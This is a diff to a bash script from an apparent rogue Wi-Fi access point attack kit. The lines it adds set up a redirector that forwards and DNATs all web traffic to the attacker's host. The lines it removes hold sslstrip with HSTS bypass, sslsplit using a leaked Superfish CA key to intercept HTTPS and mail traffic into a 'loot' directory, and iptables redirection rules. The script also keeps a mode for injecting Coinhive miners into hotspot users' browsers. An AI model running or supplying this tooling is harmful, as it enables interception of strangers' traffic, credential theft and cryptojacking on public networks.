@@ -1,8 +1,10 @@
 #!/bin/bash
 #info: https://sensepost.com/blog/2013/rogue-access-points-a-how-to/
 source $(cd $(dirname $0); pwd -P)/_custom_functions.sh
+
 upstream=eth0
 phy=wlan0
+IP_ADDR="$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')" ;\
 
 export ssl_cert_pem=$share/crackpkcs8/Superfish_CA.pem
 export ssl_cert_key=$share/crackpkcs8/Superfish_CA.key
@@ -26,22 +28,22 @@ check_ap_mode(){
 
 start_hostname(){
 	hostname WRT54G
-	echo -e "$txtgrn [*] Changed hostname to: WRT54G$endclr"
-	sleep 2
+	 echo -e "$txtgrn [*] Changed hostname to: WRT54G$endclr"
+	 sleep 2
 }
 
 clearwifi(){
 	service network-manager stop
-	rfkill unblock wlan
-        ifconfig $phy up
+    rfkill unblock wlan
+    ifconfig $phy up
 }
 
 start_macchanger(){
-if [ -z $1 ]; then
- interface=$phy
-else
+ if [ -z $1 ]; then
+  interface=$phy
+ else
  interface=$1
-fi
+ fi
 read -t 3 -p "Changing mac in 3 seconds, type x to skip [>]" ans
 echo ""
  case $ans in
@@ -145,6 +147,10 @@ start_mitmdump(){
 	mitmdump --mode transparent
 }
 
+start_apache(){
+    service apache2 start
+}
+
 start-coinhive(){
 #https://github.com/byt3bl33d3r/MITMf/
 #https://null-byte.wonderhowto.com/how-to/inject-coinhive-miners-into-public-wi-fi-hotspots-0182250/
@@ -188,7 +194,6 @@ echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
  sed -i "s|.*$Coinhive.Anonymous('.*$|var miner = new CoinHive.Anonymous('$PUB_SITE_KEY');|g" $share/coinhive-js/miner.js
 
 #Get local ip
-IP_ADDR="$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')" ;\
  echo -e "$txtgrn [*] Using local ip: $IP_ADDR $endclr"
   read -n 1 -t 3 -p "[?] Is this correct (y/n) [>]" askip ;echo ""
    if [ -z $askip ];then
@@ -257,7 +262,7 @@ killem(){
 #       pkill -f start_msfconsole
         pkill -f start_nat_firewall
         pkill -f net-creds
-        pkill -f nodogsplash
+#        pkill -f nodogsplash #TODO REMOVED
 #       pkill -f python
 #       pkill -f ruby
         pkill -f sslsplit
@@ -387,89 +392,26 @@ start-noupstream-eap(){
 	killem	  #Kill all shit and exit
 }
 
-start_nodogsplash(){
-#nodogsplash="$etc/nodogsplash/nodogsplash_x86_x64_kali"
-DATENOW="$(date "+%s")"
+start-redirector(){
+ echo -e "$txtgrn [*] Starting apache $endclr"
+  ./$0 --start_apache &   #Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley
 
- echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
-  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
- echo -e "$txtgrn [*] Changing hostname $endclr"
-  ./$0 --start_hostname   #Change systems hostname
- echo -e "$txtgrn [*] Stopping newtork-manager & unblocking wifi $endclr"
-  ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+#Enable Forwarding
+ echo "1" > /proc/sys/net/ipv4/ip_forward
+#Forward traffic on port 80 to ip: $IP_ADDR on port 80 ( for example )
+ iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
+#Ask IPtables to masquerade:
+ iptables -t nat -A POSTROUTING -j MASQUERADE
 
- echo Starting Apache
-  service apache2 start
-
- echo -e "$txtgrn [*] Changing mac $endclr"
-ifconfig $phy down
-macchanger -r $phy         #randomise our MAC
-iw reg set BO                      #change our regulatory domain to something more permissive
-ifconfig $phy up
-
-# echo Starting Airbase
-#airbase-ng -c6 -a E96162AC5BBC -e "Internet" -v $phy&
-
-echo -e "$txtgrn [*] Starting nodogsplash $endclr"
-nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
-#  $nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
-  sleep 9
-#echo -e "$txtgrn [*] Starting hostapd $endclr"
-hostapd /etc/hostapd/hostapd.conf
-# ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
-  sleep 5
- echo -e "$txtgrn [*] Starting dnsmasq $endclr"
-  ./$0 --start_dnsmasq &&    #Dnsmasq - A lightweight DHCP and caching DNS server
-   sleep 5
- echo -e "$txtgrn [*] Starting nat-firewall $endclr"
-  ./$0 --start_nat_firewall && #Nat firewall
-   sleep 2
 #brctl addbr br0
 #brctl addif br0 eth0              #Assuming eth0 is your upstream interface
 #brctl addif br0 wlan2
 #ifconfig br0 up
 
-#SSLStrip with HSTS bypass
- echo Starting sslstrip
-  cd $share/sslstrip-hsts/sslstrip2/
-   python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.$DATENOW&
-  cd $share/sslstrip-hsts/dns2proxy/
-  python dns2proxy.py -i $phy&
- cd -
-
-#SSLSplit
- echo Starting sslsplit
- sslsplit -D -Z -S $loot/sslsplit -c $ssl_cert_pem -k $ssl_cert_key -O -l $loot/sslsplit-connect.log.$DATENOW \
- https 0.0.0.0 10443 \
- ssl 0.0.0.0 10993 \
- tcp 0.0.0.0 10143 \
- ssl 0.0.0.0 10995 \
- tcp 0.0.0.0 10110 \
- ssl 0.0.0.0 10465 \
- tcp 0.0.0.0 10025&
-
- iptables -t nat -D PREROUTING 1
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10000
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 443 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10443
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 143 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10143
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 993 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10993
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 465 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10465
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 25 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10025
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 995 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10995
- iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 110 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10110
- iptables -t nat -A PREROUTING -i $phy -m mark --mark 0x200/0x700 -j ACCEPT
- iptables -t nat -A PREROUTING -i $phy -m mark --mark 0x400/0x700 -j ACCEPT
- iptables -t nat -A PREROUTING -i $phy -d 0.0.0.0/0 -p tcp --dport 53 -j ACCEPT
- iptables -t nat -A PREROUTING -i $phy -d 0.0.0.0/0 -p udp --dport 53 -j ACCEPT
- iptables -t nat -A PREROUTING -i $phy -d 10.0.0.1 -p tcp --dport 80 -j ACCEPT
- iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:2050
- iptables -t nat -A PREROUTING -i $phy -j ACCEPT
-
 ## Start FireLamb
 # echo Starting FireLamb
 # $share/firelamb/firelamb.py -i $phy --karma_sslsplit $loot/sslsplit -s $loot/sslsplit-connect.log.$DATENOW&
 
-#End..
  hangon && #Wait for Enter key
  killem    #Kill all shit and exit
 }
@@ -486,6 +428,7 @@ echo "$FUNCNAME"
  Usage: $(basename "$0") [-n] [--start-noupstream     - Will start MANA in a "fake Internet" mode. Useful for places where people leave their wifi on, but there is no upstream Internet. Also contains the captive portal.
  Usage: $(basename "$0") [-e] [--start-noupstream-eap - Will start MANA with the EAP attack and noupstream mode.
  Usage: $(basename "$0") [-c] [--start-coinhive       - Will start mitm JavaScript miner for the Monero Blockchain.
+ Usage: $(basename "$0") [-r] [--start-redirector     - Will start --start-nat-simple & apache2 and redirects all traffic to 10.0.0.1 with iptable rules.
 
  Usage: $(basename "$0") [--check_ap_mode]            - Check if "AP-mode" supported interface is present
  Usage: $(basename "$0") [--start_hostname]           - Change systems hostname
@@ -542,8 +485,9 @@ for ARG in $@
       -s|--start-nat-simple)       start-nat-simple     ;;
       -n|--start-noupstream)       start-noupstream     ;;
       -e|--start-noupstream-eap)   start-noupstream-eap ;;
-      -d|--start_nodogsplash)      start_nodogsplash    ;;
+#      -d|--start_nodogsplash)      start_nodogsplash    ;; #TODO: REMOVED
       -c|--start-coinhive)         start-coinhive       ;;
+      -r|--start-redirector)       start-redirector     ;;
    #Other
       -e|--edit)                   nano "$0" ; exit     ;;
       -h|--help)                   usage     ; break    ;;
